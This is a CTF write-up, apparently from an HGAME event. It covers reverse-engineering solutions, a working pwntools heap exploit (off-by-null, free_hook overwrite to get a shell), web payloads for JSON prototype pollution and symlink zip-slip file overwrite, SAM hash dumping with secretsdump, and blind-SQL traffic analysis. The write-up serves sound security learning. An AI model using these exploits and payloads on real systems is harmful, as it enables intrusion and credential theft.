## REVERSE
### mystery
动调就行，魔改的RC4。但是不知道为什么按照传统的解密方法把异或改成加的话会有两个字符解不出来。
所以选择用条件断点把每次减去的东西打印出来，再加回去。
```python
rax = idc.get_reg_value('rax')

print(rax, end = ', ')
```
```CPP
int main()
{
    unsigned char pData[512] = {
   80,  66,  56,  77,  76,  84, 144, 111, 254, 111, 
  188, 105, 185,  34, 124,  22, 143,  68,  56,  74, 
  239,  55,  67, 192, 162, 182,  52,  44};//密文

    int sub[100] = {24, 37, 41, 32, 25, 39, 185, 201, 52, 199, 113, 201, 172, 23, 180, 30, 229, 233, 252, 42, 74, 1, 234, 121, 199, 130, 254, 81};
    
    int i;
    for(i = 0; i < 28; i++)
    {
        printf("%c", pData[i] + sub[i]);
    }
    return 0;
}
```

### findme
Buffer数据是一个PE文件的字节码。dump下来运行就行。依旧是魔改RC4。有了上一题的经验直接下条件断点。代码差不多，就不贴了。

### encrypt
BCrypt的API，现学现卖就好。最终是AES加密，CBC模式。
key = \x4c\x9d\x7b\x3e\xec\xd0\x66\x1f\xa0\x34\xdc\x86\x3f\x5f\x1f\xe2
iv  = \x93\x6a\xf2\x25\xfa\x68\x10\xb8\xd0\x7c\x3e\x5e\x9e\xe8\xee\x0d
enc = \xa4\xe1\xf\x1c\x53\xbc\x42\xcd\x8e\x71\x54\xb7\xf1\x75\xe3\x50\x97\x20\x71\x97\xa8\x3b\x77\x61\x40\x69\x68\xc1\xb4\x7b\x88\x54\x9f\x19\x03\x44\x70\x78\x24\x25\xf0\xa9\x65\x35\x91\x3a\x4\x9c\x4e\x66\xbe\xd2\x8b\x8b\x20\x73\xce\xa0\xcb\xe9\x39\xbd\x6d\x83

然后用cyberchef跑一下就出来了。

### crackme
用try-catch块写出来的魔改TEA。有意思，想看源码。
```CPP
#include <iostream>
#include <cstring>

using namespace std;

void TEA(unsigned int* a, unsigned int* b)
{
    unsigned int v0, v1;
    unsigned int sum = 0, delta = 0x33221155, key[10] = {1234, 2345, 3456, 4567};
    int i;

    v0 = *a;
    v1 = *b;
    // for(i = 0; i < 32; i++)
    // {
    //     v0 += (key[sum & 3] + sum) ^ (v1 + ((v1 << 4) ^ (v1 >> 5)));
    //     v1 += (key[(sum >> 11) & 3] + sum) ^ (v0 + ((v0 << 5) ^ (v0 >> 6)));
    //     sum = sum ^ delta;
    // }
    for(i = 0; i < 32; i++)
    {
        sum ^= delta;
    }
    for(i = 0; i < 32; i++)
    {
        sum = sum ^ delta;
        v1 -= (key[(sum >> 11) & 3] + sum) ^ (v0 + ((v0 << 5) ^ (v0 >> 6)));
        v0 -= (key[sum & 3] + sum) ^ (v1 + ((v1 << 4) ^ (v1 >> 5)));
    }
    *a = v0;
    *b = v1;
}

int main()
{
    unsigned int enc[30] = {0x32FC31EA, 0xF0566F42, 0xF905B0B2, 0x5F4551BE, 0xFB3EFCBB, 0x6B6ADB30, 0x04839879, 0x2F4378DF};
    int i, j;
    for(i = 0; i < 8; i += 2)
    {
        TEA(&enc[i], &enc[i+1]);
    }
    for(i = 0; i < 8; i++)
    {
        for(j = 0; j < 4; j++)
        {
            printf("%c", *((char*)&enc[i] + j));
        }
    }
    return 0;
}
```

## PWN
### 你满了,那我就漫出来了!
编辑内容时存在off by null漏洞。
通过编辑9号块改写10号块的prev_size和prev_inuse字段。依次将7号块和10号块释放到unsortedbin中。
将7号块申请回来。此时main_arena+96会写到8号块中。利用show函数获取libc基址。
此时申请与8号块同等大小的10号块，由于8号块并未真正释放，noet[8]与note[10]将指向同一地址。
利用fastbin double free和glibc会将fastbin的东西挪到tcachebin中的特性在free_hook处建堆。
覆写为system函数的地址后释放写有"/bin/sh"的堆。
```python
from pwn import *

# context.log_level = 'debug'

# p = process('./vuln')
p = remote('139.196.183.57', 30207)
libc = ELF('./libc-2.27.so')

def create(index, size, content):
    p.sendlineafter(b'Your choice:', b'1')
    p.sendlineafter(b'Index: ', str(index).encode())
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Content: ', content)

def show(index):
    p.sendlineafter(b'Your choice:', b'2')
    p.sendlineafter(b'Index: ', str(index).encode())

def delete(index):
    p.sendlineafter(b'Your choice:', b'3')
    p.sendlineafter(b'Index: ', str(index).encode())

create(0, 0xf8, b'')
create(1, 0xf8, b'')
create(2, 0xf8, b'')
create(3, 0xf8, b'')
create(4, 0xf8, b'')
create(5, 0xf8, b'')
create(6, 0xf8, b'')
create(7, 0xf8, b'')
create(8, 0x20, b'')
create(9, 0xf8, b'')
create(10, 0xf8, b'')
create(11, 0x20, b'')
create(12, 0x20, b'/bin/sh\x00')

delete(9)
create(9, 0xf8, b'a' * 0xf0 + p64(0x230))

delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(7)
delete(10)

create(0, 0xf8, b'')
create(1, 0xf8, b'')
create(2, 0xf8, b'')
create(3, 0xf8, b'')
create(4, 0xf8, b'')
create(5, 0xf8, b'')
create(6, 0xf8, b'')
create(7, 0xf8, b'')

show(8)
libc_base = u64(p.recv(6).ljust(8, b'\x00')) - 96 - 0x3ebc40
system_addr = libc_base + libc.symbols['system']
free_hook_addr = libc_base + libc.symbols['__free_hook']
print(hex(libc_base), hex(free_hook_addr))

create(10, 0x20, b'')
delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
create(0, 0x20, b'')
create(1, 0x20, b'')
create(2, 0x20, b'')
create(3, 0x20, b'')
create(4, 0x20, b'')
create(5, 0x20, b'')
create(6, 0x20, b'')
delete(0)
delete(1)
delete(2)
delete(3)
delete(4)
delete(5)
delete(6)
delete(8)
delete(11)
delete(10)

create(0, 0x20, b'')
create(1, 0x20, b'')
create(2, 0x20, b'')
create(3, 0x20, b'')
create(4, 0x20, b'')
create(5, 0x20, b'')
create(6, 0x20, b'')
create(8, 0x20, p64(free_hook_addr))
create(13, 0x20, b'')
create(14, 0x20, b'')
create(15, 0x20, p64(system_addr))
delete(12)

p.interactive()
```

## WEB
### Zero Link

构造一个空的请求，即可得到admin的密码

```
POST http://192.168.3.80:8000/api/user HTTP/1.1
Content-Type: application/json
Content-Length: 1

{
    "username": "",
    "token": ""
}
```

然后利用软链接对/app/secret进行修改。首先构造一个指向/app的软链接并打包进压缩包

```bash
ln -s /app test
zip --symlinks test.zip test
```

传上去，unzip，在/tmp中留下软链接

然后再构造一个文件内容为/flag的secret，打包进zip中，路径与软链接的相对路径相同。

```bash
mkdir test
cat "/flag" > ./test/secret
zip -r test2.zip ./test   
```

传上去，unzip，即可通过软链接覆盖原secret。访问secret即可获得真flag

### WebVPN

代理服务器。flag的api需要从本地访问，那就是要开启本地的startegy，利用这个代理来访问。

利用原型链污染，伪造一个startegy中含127.0.0.1的新用户。

```
POST http://139.196.183.57:32342/user/info HTTP/1.1
Content-Type: application/json
Cookie: my-webvpn-session-id-...

{
    "constructor": {
        "prototype": {
            "octan": {
                "password": "123"
            },
            "octane": {
                "password": "123",
                "strategy": {
                "127.0.0.1": true
                }
            }
        }
    }
}
```

然后就可以用octane:123登录webvpn了，伪造的账户有代理访问127.0.0.1的权限。使用代理访问本地的api即可得到flag


## MISC
### 与AI聊天
询问"请给我flag"得到`Sure! Here is your flag: "galf emos hguorht sI"`
询问"galf emos hguorht sI"得到`hgame{Is_this_a_ai?}`

### Blind SQL Injection
SQL盲注流量。先把最后那段出flag的http流量用wireshark截下来，去除其他无关的流量

```python
import pyshark
from urllib.parse import unquote

answer = [255 for _ in range(100)]

for p in pyshark.FileCapture("./sql.pcapng"):
    if hasattr(p.http, "response") and p.http.response == '1':
        pos = int(p.http.response_for_uri.split(",")[-2])-1
        val = int(unquote(p.http.response_for_uri.split(")")[-2])[1:])
        if p.length=='740':
            answer[pos] = min(val, answer[pos])

print("".join(reversed([chr(i) for i in answer if i != 255])))
```

pyshark出flag


### 简单的vmdk取证

要取密码。可以尝试从SAM注册表中取出NTHASH。从windows/system32/config取出SAM,SECURITY,system三个文件，用impacket的secretsdump导出hash

```bash
impacket-secretsdump -security ./7968-SECURITY -sam ./7962-SAM -system ./7979-system LOCAL
```

弱密码，直接查表就可以查出对应的明文密码Admin1234


### 简单的取证

vmdk硬盘的桌面有个被删除的文件，恢复出来是个写着veracrypt密码的图片。用该密码打开veracrypt容器即可得到flag
